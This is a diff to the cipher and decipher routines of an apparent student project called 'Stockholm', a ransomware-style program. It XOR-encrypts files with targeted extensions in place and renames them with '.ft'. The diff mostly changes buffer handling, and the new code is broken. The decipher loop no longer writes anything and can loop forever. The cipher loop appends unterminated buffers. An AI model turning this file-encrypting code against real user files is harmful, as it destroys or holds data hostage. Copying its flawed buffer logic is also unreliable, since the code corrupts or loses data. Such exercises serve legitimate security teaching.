@@ -6,7 +6,7 @@
 /*   By: bguyot <bguyot@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/05/19 09:51:57 by bguyot            #+#    #+#             */
-/*   Updated: 2023/05/19 15:55:33 by bguyot           ###   ########.fr       */
+/*   Updated: 2023/05/19 16:11:04 by bguyot           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -108,7 +108,6 @@ void	Stockholm::_decipherFile(std::filesystem::path path)
 	if (path.extension() != ".ft")
 		return ;
 		
-	
 	//cipher the file
 	try {
 		int fd_in = open(path.c_str(), O_RDONLY);
@@ -118,16 +117,21 @@ void	Stockholm::_decipherFile(std::filesystem::path path)
 			// std::cout << "Error while opening file " << path << std::endl;
 			return ;
 		}
-		char buffer;
-		buffer = 0;
+		char *buffer = new char[1024];
+		bzero(buffer, 1024);
 		int ret = 0;
-		int i = 0;
 		std::string file_data = "";
-		while ((ret = read(fd_in, &buffer, 1)) > 0)
+		ret = read(fd_in, buffer, 1024);
+		while (ret > 0)
 		{
-			buffer ^= this->_key[i % this->_key.length()];
-			write(fd_out, &buffer, 1);
-			i++;
+			for (int i = 0; i < ret; i++)
+			{
+				buffer[i] ^= this->_key[i % this->_key.length()];
+			}
+
+			//read the next 1024 bytes, unless it's the end of the file
+			if (ret == 1024)
+				ret = read(fd_in, buffer, 1024);
 		}
 		if (ret == -1)
 		{
@@ -136,6 +140,7 @@ void	Stockholm::_decipherFile(std::filesystem::path path)
 		}
 		close(fd_in);
 		close(fd_out);
+		
 		//remove the .ft extension to the file
 		std::filesystem::path new_path = path;
 		std::filesystem::rename(path, new_path.replace_extension(""));
@@ -169,7 +174,6 @@ void	Stockholm::_cipherFile(std::filesystem::path path)
 	//check if the file path extension is in the _extensions vector
 	if (std::find(this->_extensions.begin(), this->_extensions.end(), path.extension()) == this->_extensions.end())
 		return ;
-		
 	
 	//cipher the file
 	try {
@@ -179,10 +183,10 @@ void	Stockholm::_cipherFile(std::filesystem::path path)
 			// std::cout << "Error while opening file " << path << std::endl;
 			return ;
 		}
-		char *buffer = new char[1];
+		char *buffer = new char[1024];
 		int ret = 0;
 		std::string file_data = "";
-		while ((ret = read(fd, buffer, 1)) > 0)
+		while ((ret = read(fd, buffer, 1024)) > 0)
 		{
 			file_data += buffer;
 		}
@@ -198,9 +202,11 @@ void	Stockholm::_cipherFile(std::filesystem::path path)
 		lseek(fd, 0, SEEK_SET);
 		write(fd, file_data.c_str(), file_data.length());	
 		close(fd);
+
 		//add the .ft extension to the file
 		std::filesystem::path newPath = path;
 		std::filesystem::rename(path, newPath += ".ft");
+
 		if (!this->_silent)
 			std::cout << "Ciphering file " << path << std::endl;
 	} catch(...) {
